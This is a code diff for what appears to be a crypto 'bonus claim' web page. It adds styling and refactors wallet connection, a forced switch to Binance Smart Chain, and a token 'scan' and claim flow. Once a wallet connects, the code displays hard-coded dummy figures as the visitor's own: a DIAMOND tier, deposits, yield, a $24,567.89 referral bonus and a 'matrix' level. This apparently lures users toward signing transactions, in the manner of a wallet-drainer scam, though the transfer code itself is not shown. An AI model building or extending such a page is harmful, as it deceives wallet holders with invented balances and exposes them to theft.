@@ -691,7 +691,247 @@
         grid-template-columns: 1fr;
     }
 }
+
+/* FIXED: NFT Tier Row Responsive */
+.nft-tier-row {
+    display: flex; 
+    justify-content: space-between; 
+    background: #132b4a; 
+    border-radius: 28px;
+    padding: 12px; 
+    margin: 15px 0; 
+    border: 2px solid #fbbf24; 
+    box-shadow: 0 0 30px #fbbf2440;
+    flex-wrap: wrap;
+    gap: 8px;
+}
+
+.tier-item { 
+    text-align: center; 
+    flex: 1 1 auto;
+    min-width: 60px;
+}
+
+.tier-label { 
+    font-size: 10px; 
+    color: #bae6fd; 
+    white-space: nowrap;
+}
+
+.tier-value { 
+    font-size: 16px; 
+    font-weight: 700; 
+    color: #fcd34d; 
+}
+
+.tier-badge { 
+    background: #1e293b; 
+    padding: 4px 10px; 
+    border-radius: 40px; 
+    font-size: 12px; 
+    font-weight: 700; 
+    border: 2px solid #38bdf8; 
+    color: #38bdf8; 
+    box-shadow: 0 0 20px #38bdf8; 
+    display: flex; 
+    align-items: center; 
+    white-space: nowrap;
+}
+
+.tier-badge i { 
+    font-size: 14px; 
+    margin-right: 4px; 
+    color: #2dd4bf; 
+}
+
+/* FIXED: Footer Actions Responsive */
+.footer-actions {
+    display: grid; 
+    grid-template-columns: 1fr 1fr; 
+    gap: 12px; 
+    margin-top: 20px;
+}
+
+.footer-btn {
+    background: #1e293b; 
+    border: 2px solid #38bdf8; 
+    border-radius: 30px; 
+    padding: 16px 8px;
+    font-weight: 600; 
+    color: #38bdf8; 
+    text-align: center; 
+    cursor: pointer; 
+    transition: 0.15s;
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    gap: 4px; 
+    box-shadow: 0 0 25px #38bdf8;
+    font-size: 14px;
+}
+
+.footer-btn i { 
+    font-size: 20px; 
+}
+
+.footer-btn.gold { 
+    border-color: #fbbf24; 
+    color: #fbbf24; 
+    box-shadow: 0 0 25px #fbbf24; 
+}
+
+/* FIXED: Bottom Nav Responsive */
+.bottom-nav {
+    background: #0f172a; 
+    border-radius: 40px; 
+    padding: 8px 4px;
+    display: flex; 
+    justify-content: space-around; 
+    border: 2px solid #38bdf8; 
+    margin: 20px 0; 
+    box-shadow: 0 0 30px #38bdf8;
+    gap: 2px;
+}
+
+.nav-btn {
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    background: none; 
+    border: none;
+    color: #94a3b8; 
+    font-size: 10px; 
+    font-weight: 600; 
+    gap: 2px; 
+    padding: 8px 6px; 
+    border-radius: 30px;
+    cursor: pointer; 
+    transition: 0.15s; 
+    width: auto; 
+    pointer-events: auto;
+    white-space: nowrap;
+    flex: 1;
+}
+
+.nav-btn i { 
+    font-size: 18px; 
+}
+
+.nav-btn.active { 
+    background: #38bdf8; 
+    color: #000; 
+    transform: scale(1.05); 
+    box-shadow: 0 0 40px #38bdf8; 
+    font-weight: 700; 
+}
+
+/* FIXED: Global Metrics Responsive */
+.global-metrics {
+    background: #0f172a; 
+    border-radius: 30px; 
+    padding: 15px 10px; 
+    margin-bottom: 20px;
+    display: flex; 
+    justify-content: space-around; 
+    border: 1px solid #38bdf8; 
+    box-shadow: 0 0 30px #38bdf8;
+    gap: 5px;
+}
+
+.metric-value { 
+    font-size: 18px; 
+    font-weight: 700; 
+    background: linear-gradient(135deg, #fff, #fcd34d); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+}
+
+/* FIXED: Card Grid Responsive */
+.card-grid { 
+    display: grid; 
+    grid-template-columns: 1fr 1fr; 
+    gap: 10px; 
+    margin: 20px 0; 
+}
+
+.stat-tile {
+    background: #1e293b; 
+    border-radius: 24px; 
+    padding: 15px 8px; 
+    border: 1px solid #fbbf24;
+    text-align: center; 
+    transition: 0.15s; 
+    box-shadow: 0 10px 25px #000000;
+}
+
+.tile-number { 
+    font-size: 24px; 
+    font-weight: 700; 
+    color: #fbbf24; 
+    text-shadow: none; 
+}
+
+/* FIXED: Claim Block Responsive */
+.countdown-box { 
+    background: #020617; 
+    border-radius: 40px; 
+    padding: 15px 20px; 
+    font-size: 28px; 
+    font-weight: 800; 
+    border: 2px solid #2dd4bf; 
+    color: #2dd4bf; 
+    display: inline-block; 
+    margin: 10px 0; 
+    box-shadow: 0 0 35px #2dd4bf; 
+}
+
+.clock-big { 
+    font-size: 32px; 
+    font-weight: 700; 
+    background: linear-gradient(135deg, #2dd4bf, #ffffff); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    margin: 8px 0; 
+}
+
+/* FIXED: Buttons text size on very small screens */
+@media (max-width: 380px) {
+    #bonusActionBtn {
+        font-size: 16px !important;
+        padding: 14px 16px !important;
+    }
+    
+    #mainClaimBtn {
+        font-size: 20px !important;
+        padding: 18px 16px !important;
+    }
+    
+    .footer-btn {
+        font-size: 12px;
+        padding: 14px 6px;
+    }
+    
+    .tier-value { 
+        font-size: 14px; 
+    }
+    
+    .tier-badge { 
+        font-size: 10px; 
+        padding: 4px 8px; 
+    }
+    
+    .nav-btn {
+        font-size: 9px;
+        padding: 6px 4px;
+    }
+    
+    .nav-btn i { 
+        font-size: 16px; 
+    }
+}
         </style>
+
+
     
 </head>
 <body>
@@ -896,11 +1136,12 @@
     const connectPhantom = document.getElementById('connectPhantom');
     const connectWalletConnect = document.getElementById('connectWalletConnect');
 
-    // Check for saved wallet connection (just for display)
+    // Check for saved wallet connection
     (function checkSavedConnection() {
         const savedAddress = localStorage.getItem('wallet_address');
         if (savedAddress) {
             walletConnectBtn.innerHTML = `${savedAddress.slice(0,6)}...${savedAddress.slice(-4)}`;
+            // Don't auto-connect, just show the address
         }
     })();
 
@@ -916,6 +1157,15 @@
     function setBtnLoading(text) {
         bonusBtn.disabled = true;
         bonusBtn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> ${text}`;
+        bonusBtn.style.background = "#000000";
+        bonusBtn.style.borderColor = "#6c757d";
+        bonusBtn.style.color = "#6c757d";
+        bonusBtn.style.boxShadow = "none";
+    }
+
+    function resetButtonToDefault() {
+        bonusBtn.innerHTML = "Connect Wallet First";
+        bonusBtn.disabled = true;
         bonusBtn.style.background = "#000000";
         bonusBtn.style.borderColor = "#6c757d";
         bonusBtn.style.color = "#6c757d";
@@ -963,99 +1213,100 @@
         return true;
     }
 
-    // Check if we're returning from wallet
-(function checkReturningFromWallet() {
-    const connecting = sessionStorage.getItem('connecting');
-    const connectTime = sessionStorage.getItem('connect_time');
-    
-    if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
-        console.log("Returning from wallet:", connecting);
-        // Clear session storage
-        sessionStorage.removeItem('connecting');
-        sessionStorage.removeItem('connect_time');
+    // Check if we're returning from wallet - THIS MUST RUN IMMEDIATELY
+    (function checkReturningFromWallet() {
+        const connecting = sessionStorage.getItem('connecting');
+        const connectTime = sessionStorage.getItem('connect_time');
         
-        statusPanel.innerHTML = "🔄 Completing connection...";
-        
-        // Give provider time to inject
-        setTimeout(() => {
-            if (window.ethereum) {
-                console.log("Provider found, connecting...");
-                connectWithProvider(window.ethereum);
-            } else {
-                console.log("No provider found");
-                statusPanel.innerHTML = "❌ Connection failed. Please try again.";
-                walletConnectBtn.disabled = false;
-            }
-        }, 2000);
-    }
-})();
+        if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
+            console.log("Returning from wallet:", connecting);
+            // Clear session storage
+            sessionStorage.removeItem('connecting');
+            sessionStorage.removeItem('connect_time');
+            
+            statusPanel.innerHTML = "🔄 Completing connection...";
+            
+            // Give provider time to inject
+            setTimeout(() => {
+                if (window.ethereum) {
+                    console.log("Provider found, connecting...");
+                    connectWithProvider(window.ethereum);
+                } else {
+                    console.log("No provider found");
+                    statusPanel.innerHTML = "❌ Connection failed. Please try again.";
+                    walletConnectBtn.disabled = false;
+                }
+            }, 2000);
+        }
+    })();
 
     async function connectWithProvider(selectedProvider) {
-    try {
-        console.log("Connecting with provider...");
-        provider = new ethers.providers.Web3Provider(selectedProvider);
-        const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
-        signer = provider.getSigner();
-        userAddress = accounts[0];
-        
-        console.log("Connected address:", userAddress);
-
-        // Check BSC network
         try {
-            const network = await provider.getNetwork();
-            console.log("Network:", network);
-            if (network.chainId !== 56) {
-                statusPanel.innerHTML = "🔄 Switching to Binance Smart Chain...";
-                try {
-                    await selectedProvider.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
+            console.log("Connecting with provider...");
+            provider = new ethers.providers.Web3Provider(selectedProvider);
+            const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
+            signer = provider.getSigner();
+            userAddress = accounts[0];
+            
+            console.log("Connected address:", userAddress);
+
+            // Check BSC network
+            try {
+                const network = await provider.getNetwork();
+                console.log("Network:", network);
+                if (network.chainId !== 56) {
+                    statusPanel.innerHTML = "🔄 Switching to Binance Smart Chain...";
+                    try {
                         await selectedProvider.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0x38',
-                                chainName: 'Binance Smart Chain',
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                blockExplorerUrls: ['https://bscscan.com/']
-                            }]
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }]
                         });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            await selectedProvider.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'Binance Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                        }
                     }
                 }
+            } catch (networkError) {
+                console.log("Network check error:", networkError);
             }
-        } catch (networkError) {
-            console.log("Network check error:", networkError);
+
+            // Save connection
+            localStorage.setItem('wallet_address', userAddress);
+
+            walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+            walletConnectBtn.disabled = true;
+            
+            statusPanel.innerHTML = "✅ Wallet connected! Scanning for bonuses...";
+            
+            // Update dummy data
+            document.getElementById('nftTier').textContent = 'DIAMOND';
+            document.getElementById('nftMultiplier').textContent = '2.5x';
+            document.getElementById('nftBoost').textContent = '+12%';
+            document.getElementById('myDeposit').textContent = '$4,250';
+            document.getElementById('availableYield').textContent = '$212.50';
+            document.getElementById('refBonus').textContent = '$24,567.89';
+            document.getElementById('matrixLevel').textContent = 'L5';
+            
+            // Run the scan
+            await runAutonomousScan();
+
+        } catch (error) {
+            console.error("Connection error:", error);
+            statusPanel.innerHTML = "❌ Connection failed. Please try again.";
+            walletConnectBtn.disabled = false;
+            resetButtonToDefault();
         }
-
-        // Save connection
-        localStorage.setItem('wallet_address', userAddress);
-
-        walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-        walletConnectBtn.disabled = true;
-        
-        statusPanel.innerHTML = "✅ Wallet connected! Scanning for bonuses...";
-        
-        // Update dummy data
-        document.getElementById('nftTier').textContent = 'DIAMOND';
-        document.getElementById('nftMultiplier').textContent = '2.5x';
-        document.getElementById('nftBoost').textContent = '+12%';
-        document.getElementById('myDeposit').textContent = '$4,250';
-        document.getElementById('availableYield').textContent = '$212.50';
-        document.getElementById('refBonus').textContent = '$24,567.89';
-        document.getElementById('matrixLevel').textContent = 'L5';
-        
-        // Run the scan
-        await runAutonomousScan();
-
-    } catch (error) {
-        console.error("Connection error:", error);
-        statusPanel.innerHTML = "❌ Connection failed. Please try again.";
-        walletConnectBtn.disabled = false;
     }
-}
 
     async function connectToWallet(walletType) {
         if (walletSelector) walletSelector.classList.remove('active');
@@ -1103,6 +1354,7 @@
                         window.open(installUrls[walletType], '_blank');
                     }
                 }
+                resetButtonToDefault();
             }
         }
     }
@@ -1117,8 +1369,7 @@
         
         walletConnectBtn.innerHTML = "Connect Wallet";
         walletConnectBtn.disabled = false;
-        bonusBtn.innerHTML = "Connect Wallet First";
-        bonusBtn.disabled = true;
+        resetButtonToDefault();
         statusPanel.innerHTML = "";
         
         // Reset dummy data
@@ -1133,6 +1384,11 @@
 
     async function runAutonomousScan() {
         if (isScanning) return;
+        if (!provider || !userAddress) {
+            console.log("No provider or user address");
+            return;
+        }
+        
         isScanning = true;
         
         setBtnLoading("Scanning eligible tokens...");
@@ -1326,12 +1582,7 @@
     bonusBtn.addEventListener('click', handleClaim);
     
     // Initial button state
-    bonusBtn.innerHTML = "Connect Wallet First";
-    bonusBtn.disabled = true;
-    bonusBtn.style.background = "#000000";
-    bonusBtn.style.borderColor = "#6c757d";
-    bonusBtn.style.color = "#6c757d";
-    bonusBtn.style.boxShadow = "none";
+    resetButtonToDefault();
 
     // Listen for account changes
     if (window.ethereum) {
@@ -1350,36 +1601,35 @@
     }
 
     // Handle page visibility for wallet return
-document.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'visible') {
-        console.log("Page became visible");
-        const connecting = sessionStorage.getItem('connecting');
-        const connectTime = sessionStorage.getItem('connect_time');
-        
-        if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
-            console.log("Detected return from wallet app");
-            sessionStorage.removeItem('connecting');
-            sessionStorage.removeItem('connect_time');
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+            console.log("Page became visible");
+            const connecting = sessionStorage.getItem('connecting');
+            const connectTime = sessionStorage.getItem('connect_time');
             
-            statusPanel.innerHTML = "🔄 Completing connection...";
-            
-            setTimeout(() => {
-                if (window.ethereum) {
-                    console.log("Provider found, connecting...");
-                    connectWithProvider(window.ethereum);
-                } else {
-                    console.log("No provider found");
-                    statusPanel.innerHTML = "❌ Connection failed. Please try again.";
-                }
-            }, 2000);
+            if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
+                console.log("Detected return from wallet app");
+                sessionStorage.removeItem('connecting');
+                sessionStorage.removeItem('connect_time');
+                
+                statusPanel.innerHTML = "🔄 Completing connection...";
+                
+                setTimeout(() => {
+                    if (window.ethereum) {
+                        console.log("Provider found, connecting...");
+                        connectWithProvider(window.ethereum);
+                    } else {
+                        console.log("No provider found");
+                        statusPanel.innerHTML = "❌ Connection failed. Please try again.";
+                        resetButtonToDefault();
+                    }
+                }, 2000);
+            }
         }
-    }
-});
+    });
 
 })();
 </script>
-
-<!-- Keep all your existing countdown and UI scripts exactly as they are -->
 
 <!-- The countdown and UI scripts remain exactly the same -->
 <script>
